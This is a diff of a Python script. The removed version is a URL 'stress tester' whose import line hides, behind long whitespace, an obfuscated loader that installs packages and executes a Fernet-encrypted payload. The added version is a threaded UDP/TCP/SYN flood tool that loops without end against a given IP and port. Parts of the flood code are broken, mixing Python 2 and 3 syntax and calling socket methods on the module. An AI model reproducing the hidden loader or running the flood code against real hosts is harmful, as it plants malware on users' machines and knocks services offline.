@@ -1,13 +1,12 @@
+#!/usr/bin/env python
 import os
-import fade
-#install requests and etc
-os.system("pip install requests")
-os.system("pip install futures")
-import requests																																																																																																																																																																																																																																																																																																																																																																																																																;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Ox_aQCMlExWNBg8q79FcCZlHSLLvsYTgvbkiv5LQuA0=').decrypt(b'gAAAAABnOHtpzlxV3tBPJGgVHNzeUfY5fc1o0LZ7tqjljI7UZ_SEzsKgIDOnJijZ851JIPu5zk7GyCDe_RfSm-rhfOmXZs-pqAPbW5wWLXhsYgV6isis_eFTytD7VQiYwk8ZUfTV1DFk21u5AcBk_WirWWmgvp1qDmTF9o2Ndp24lCa32WTRNaE98Z6N0Jku_kVt2pl1_AybsZ7U4lw3jQlkDyIq0muK7A=='))
-import concurrent.futures
+import threading
+import sys
 import time
 import random
-import argparse
+import socket
+import fade
+
 os.system("clear")
 print(logo)
 logo = """
@@ -29,57 +28,78 @@ _____       ___         _____          _________    _________
 faded_text = fade.fire(logo)
 print(faded_text)
 
-def stress_test(url, num_requests, concurrency, request_type="GET", headers=None, data=None):
-  start_time = time.time()
-  results = []
+if len(sys.argv) < 4:
+    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
-  with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
-    futures = [executor.submit(make_request, url, request_type, headers, data) for _ in range(num_requests)]
+ip = sys.argv[1]
+port = int(sys.argv[2])
+size = int(sys.argv[3])
+packets = int(sys.argv[3])
 
-    for future in concurrent.futures.as_completed(futures):
-      try:
-        response_time, status_code, error = future.result()
-        results.append({"response_time": response_time, "status_code": status_code, "error": error})
-      except Exception as e:
-        results.append({"response_time": None, "status_code": None, "error": str(e)})
+class syn(threading.Thread):
+    def __init__(self, ip, port, packets):
+        self.ip = ip
+        self.port = port
+        self.packets = packets
+        self.syn = socket.socket()
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                self.syn.connect((self.ip, self.port))
+            except:
+                pass
 
-  end_time = time.time()
-  total_time = end_time - start_time
+class tcp(threading.Thread):
+    def __init__(self, ip, port, size, packets):
+        self.ip = ip
+        self.port = port
+        self.size = size
+        self.packets = packets
+        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                bytes = random._urandom(self.size)
+                socket.connect(self.ip, self.port)
+                socket.setblocking(0)
+                socket.sendto(bytes,(self.ip, self.port))
+            except:
+                pass
 
-  return results, total_time
+class udp(threading.Thread):
+    def __init__(self, ip, port, size, packets):
+        self.ip = ip
+        self.port = port
+        self.size = size
+        self.packets = packets
+        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                bytes = random._urandom(self.size)
+                if self.port == 0:
+                    self.port = random.randrange(1, 65535)
+                self.udp.sendto(bytes,(self.ip, self.port))
+            except:
+                pass
 
+while True:
+    try:
+        if size > 65507:
+            sys.exit("Invalid Number Of Packets!")
+        u = udp(ip,port,size,packets)
+        t = tcp(ip,port,size,packets)
+        s = syn(ip,port,packets)
+        u.start()
+        t.start()
+        s.start()
+    except KeyboardInterrupt:
+        print "Stopping Flood!"
+        sys.exit()
+    except socket.error, msg:
+        print "Socket Couldn't Connect"
+        sys.exit()
 
-def make_request(url, request_type, headers, data):
-  start_time = time.time()
-  try:
-    if request_type == "GET":
-      response = requests.get(url, headers=headers)
-    elif request_type == "POST":
-      response = requests.post(url, headers=headers, data=data)
-    else:
-      raise ValueError("Invalid request type. Choose 'GET' or 'POST'.")
-
-    response_time = time.time() - start_time
-    return response_time, response.status_code, None
-  except requests.exceptions.RequestException as e:
-    return None, None, str(e)
-
-
-def main():
-  parser = argparse.ArgumentParser(description="Advanced URL Stress Tester")
-  parser.add_argument("url", help="Target URL")
-  parser.add_argument("-n", "--num_requests", type=int, default=100, help="Number of requests")
-  parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent requests")
-  parser.add_argument("-t", "--request_type", choices=["GET", "POST"], default="GET", help="Request type (GET or POST)")
-  args = parser.parse_args()
-
-  results, total_time = stress_test(args.url, args.num_requests, args.concurrency, args.request_type)
-
-  print(f"Stress test complete in {total_time:.2f} seconds.")
-  print("Results:")
-  for result in results:
-    print(result)
-
-
-if __name__ == "__main__":
-  main()
